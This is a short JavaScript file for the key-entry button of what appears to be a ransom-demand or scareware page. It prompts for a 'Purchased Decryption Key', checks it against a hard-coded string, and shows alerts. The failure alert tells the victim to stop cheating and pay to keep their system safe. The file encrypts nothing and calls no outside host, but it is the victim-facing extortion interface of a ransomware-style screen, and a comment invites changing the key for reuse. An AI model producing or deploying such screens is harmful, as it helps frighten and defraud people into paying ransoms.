// --- Configuration ---
const CORRECT_KEY = "RANSOM-786-DOOMSDAY-IMPOSSIBLE"; 
// You can change this to any secret string you want.
// ---------------------


// Get a reference to the button element using its ID.
const decryptButton = document.getElementById('decrypt-btn');

// Add an event listener to the button for the 'click' event.
decryptButton.addEventListener('click', function() {
    // 1. Display the native browser prompt dialog.
    const enteredKey = prompt("Enter the Purchased Decryption Key 🗝️:");

    // 2. Check if the user entered a key (i.e., didn't click 'Cancel').
    if (enteredKey !== null) {
        
        // 3. --- CORE KEY VALIDATION LOGIC ---
        if (enteredKey === CORRECT_KEY) {
            
            // Key is CORRECT
            alert("Key Access Granted! ✅ - Plug the USB back to the System, to Unlock the System!");
            
            // WARNING: This is the command to close the window.
            // Modern browsers often require the script to have opened 
            // the window itself to allow this to work, for security reasons.
            window.close(); 
            
        } else {
            // Key is INCORRECT
            alert("FAILURE: ⚠️ Incorrect key Entered, Don't Cheat and Pay if you want Your System Safe ⚠️");
        }
        
    } else {
        // The user clicked 'Cancel' or closed the prompt box.
        console.log("Decryption Process Cancelled.");
        alert("Decryption Process Cancelled. Are you Serious? 📂");
    }
});